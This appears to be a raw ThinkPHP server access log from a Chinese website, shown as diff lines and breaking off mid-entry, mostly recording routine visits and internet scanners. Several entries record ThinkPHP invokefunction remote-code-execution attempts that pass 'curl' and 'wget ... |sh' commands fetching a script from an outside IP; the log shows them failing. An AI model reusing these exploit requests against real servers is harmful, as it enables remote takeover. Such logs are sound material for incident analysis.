+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget -q -O - 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T14:28:42+08:00 ] 172.17.142.12 198.199.93.53 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019762s][吞吐率：50.60req/s] [内存消耗：1,719.80kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T14:46:50+08:00 ] 172.17.142.12 47.103.118.33 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.030503s][吞吐率：32.78req/s] [内存消耗：1,720.22kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.jiajiazxgg.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T14:48:56+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019614s][吞吐率：50.98req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T15:49:29+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.020080s][吞吐率：49.80req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T16:19:53+08:00 ] 172.17.142.12 106.75.14.46 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.022347s][吞吐率：44.75req/s] [内存消耗：1,720.22kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T16:32:33+08:00 ] 172.17.142.12 183.136.225.32 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019286s][吞吐率：51.85req/s] [内存消耗：1,720.15kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T16:39:07+08:00 ] 172.17.142.12 183.136.225.32 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019939s][吞吐率：50.15req/s] [内存消耗：1,720.25kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T16:55:00+08:00 ] 172.17.142.12 87.236.176.5 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.020702s][吞吐率：48.30req/s] [内存消耗：1,720.19kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T17:09:11+08:00 ] 172.17.142.12 185.180.143.81 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019912s][吞吐率：50.22req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T17:09:24+08:00 ] 172.17.142.12 185.180.143.81 GET /
+[ info ] 39.106.3.107/ [运行时间：0.020814s][吞吐率：48.04req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T17:09:30+08:00 ] 172.17.142.12 185.180.143.81 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019465s][吞吐率：51.37req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T17:14:27+08:00 ] 172.17.142.12 87.236.176.54 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019083s][吞吐率：52.40req/s] [内存消耗：1,720.18kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T18:50:55+08:00 ] 172.17.142.12 113.24.224.177 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019314s][吞吐率：51.78req/s] [内存消耗：1,721.01kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.jiajiazxgg.com',
+  'accept-language' => 'en-US,*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'Keep-Alive',
+  'referer' => 'http://www.baidu.com/s?wd=joinedupn',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:21:04+08:00 ] 172.17.142.12 109.237.96.124 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh [运行时间：0.026022s][吞吐率：38.43req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'curl 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T19:21:05+08:00 ] 172.17.142.12 109.237.96.124 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh [运行时间：0.021133s][吞吐率：47.32req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'wget -q -O - 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T19:23:15+08:00 ] 172.17.142.12 141.98.10.56 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.023331s][吞吐率：42.86req/s] [内存消耗：1,719.67kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Hello World',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:39:45+08:00 ] 172.17.142.12 123.160.221.16 GET /
+[ info ] ${ip}:${port}/ [运行时间：0.029172s][吞吐率：34.28req/s] [内存消耗：1,719.73kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'user-agent' => 'curl/7.64.1',
+  'host' => '${ip}:${port}',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:43:46+08:00 ] 172.17.142.12 113.219.251.181 GET /
+[ info ] host64.ru/ [运行时间：0.023463s][吞吐率：42.62req/s] [内存消耗：1,721.75kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'sec-gpc' => '1',
+  'dnt' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+  'host' => 'host64.ru',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:44:19+08:00 ] 172.17.142.12 125.124.59.103 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.018435s][吞吐率：54.24req/s] [内存消耗：1,721.76kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'sec-gpc' => '1',
+  'dnt' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:44:32+08:00 ] 172.17.142.12 115.231.221.53 GET /
+[ info ] jiajiazxgg.com/ [运行时间：0.018945s][吞吐率：52.78req/s] [内存消耗：1,721.75kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'sec-gpc' => '1',
+  'dnt' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+  'host' => 'jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:46:39+08:00 ] 172.17.142.12 125.124.59.103 GET /
+[ info ] 39.106.3.107/ [运行时间：0.020104s][吞吐率：49.74req/s] [内存消耗：1,721.75kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'sec-gpc' => '1',
+  'dnt' => '1',
+  'connection' => 'keep-alive',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'en;q=0.9',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T19:48:35+08:00 ] 172.17.142.12 106.225.132.207 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.020027s][吞吐率：49.93req/s] [内存消耗：1,721.76kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
